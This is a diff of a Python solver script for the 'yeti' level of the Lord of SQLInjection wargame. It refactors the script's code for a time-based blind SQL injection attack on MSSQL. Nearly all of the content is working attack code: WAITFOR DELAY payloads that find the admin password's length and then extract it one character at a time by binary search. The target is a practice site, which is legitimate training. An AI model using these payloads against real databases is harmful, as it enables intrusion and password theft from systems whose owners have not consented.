@@ -1,18 +1,19 @@
 #!/usr/bin/env python3
 import los
+import los_cookies as lc
 
 
 def check_func(*args) -> bool:
-    '''
+    """
     check time for request
     args[2]: time before request
     args[1]: time after request
-    '''
+    """
     return args[2] - args[1] > 4
 
 
 def main():
-    '''
+    """
     Yeti 43
 
     Time-based Blind injection
@@ -23,38 +24,29 @@ def main():
     echo "<hr>query : <strong>{$query}</strong><hr><br>";
     sqlsrv_query($db,$query);
 
-    $query = "select pw from prob_yeti where id='admin'"; 
+    $query = "select pw from prob_yeti where id='admin'";
     $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
     if($result['pw'] === $_GET['pw']) solve("yeti");
-    '''
+    """
 
     url = "https://los.rubiya.kr/chall/yeti_e6afc70b892148ced2d1e063c1230255.php"
-    cook = los.check_cookies(url)
+    cook = lc.check_cookies(url)
+    method = 'get'
+    inj_param = 'pw'
+    other_param = {'id': 'admin'}
 
     final_response = ''
     while 'Clear!' not in final_response:
 
         payload = "' if ((select len(pw) from prob_yeti where id='admin')>%s) WAITFOR DELAY '0:0:5' else WAITFOR DELAY '0:0:0'-- "
-        param = dict(pw=payload)
-        len_of_key = los.find_key_len(url, param, check_func, cook)
+        p = los.SqlInjection(url, cook, method, inj_param, payload, other_param=other_param)
+        len_of_key = p.find_key_len(check_func)
 
-        print(len_of_key)
+        p.payload = f"' if(unicode(substring((select pw from prob_yeti where id='admin'),%d,1))<%s) WAITFOR DELAY '0:0:5' else WAITFOR DELAY '0:0:0'-- "
+        result = p.find_binary(check_func, len_of_key)
 
-        result = ''
-        num_of_requests = 0
-        for i in range(1, len_of_key + 1):
-            payload = f"' if(unicode(substring((select pw from prob_yeti where id='admin'),{i},1))<%s) WAITFOR DELAY '0:0:5' else WAITFOR DELAY '0:0:0'-- "
-            param = dict(pw=payload)
-            left, num_requests = los.find_binary(url, param, check_func,
-                                                 32, 127, cook)
-            print(chr(left))
-            result += chr(left)
-            num_of_requests += num_requests
-
-        print('num_of_requests:', num_of_requests)
-
-        param = {'id': 'admin', 'pw': result}
-        final_response = los.get_request(url, param, cook)
+        p.payload = result
+        final_response = p.my_request()
 
     print('Yety Clear!')
 
